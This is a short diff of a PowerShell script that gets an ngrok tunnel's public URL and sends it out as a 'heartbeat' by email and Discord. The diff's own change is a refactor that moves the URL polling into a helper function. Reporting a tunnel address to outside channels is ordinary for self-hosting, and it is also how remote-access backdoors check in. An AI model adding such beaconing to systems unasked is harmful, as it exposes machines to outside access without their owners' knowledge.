@@ -1,18 +1,7 @@
-Import-Module ".\send-email.psm1" -DisableNameChecking
+Import-Module ".\core.psm1" -DisableNameChecking
 
-$stat = $true
-while($stat){
-	$tunnel = Invoke-WebRequest -Uri "http://localhost:4040/api/tunnels" -UseBasicParsing | ConvertFrom-Json
-	$port = $tunnel[0].tunnels.public_url
-	if($port -like "*.ngrok*"){
-		$stat = $false
-	} else {
-		Start-Sleep 10
-	}
-}
+$port = Get-NgrokPort
 
-Send-Email -Heartbeat "true"
-Send-Discord -Heartbeat "true"
-
-    
+Send-Email -port $port -Heartbeat 0
+Send-Discord -port $port -Heartbeat 0 
 
